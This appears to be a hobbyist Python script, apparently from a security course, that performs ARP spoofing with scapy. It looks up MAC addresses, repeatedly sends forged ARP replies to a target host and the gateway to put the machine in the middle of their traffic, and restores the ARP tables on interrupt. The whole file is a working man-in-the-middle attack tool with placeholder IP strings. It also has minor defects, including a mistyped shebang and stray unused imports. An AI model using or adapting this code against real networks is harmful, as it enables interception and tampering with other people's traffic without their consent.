#! /usr/bi/env python
from itertools import count
from tabnanny import verbose

import scapy.all as scapy
from borg.helpers import timestamp
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broad_cast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broad_cast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoofing(target_ip, spoofing_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofing_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac =get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "please target ip"
gateway_ip = "please enter router ip"
try:
    send_packets_count = 0
    while True:
        spoofing(target_ip, gateway_ip)
        spoofing(gateway_ip, target_ip)
        send_packets_count = send_packets_count + 2
        import sys
        print("\r Total packets sent: " + str(send_packets_count), end=""),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n [-] detected something. resetting the ip's \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# print("total packets send: " + str(send_packets_count)),
# sys.stdout.flush()
# packet2 = scapy.ARP(op=2, pdst=spoofing_ip, hwdst="9c:53:22:e7:88:3b", psrc=target_ip)
# scapy.send(packet)
# scapy.send(packet2)


# print(packet.show())
# print(packet.summary())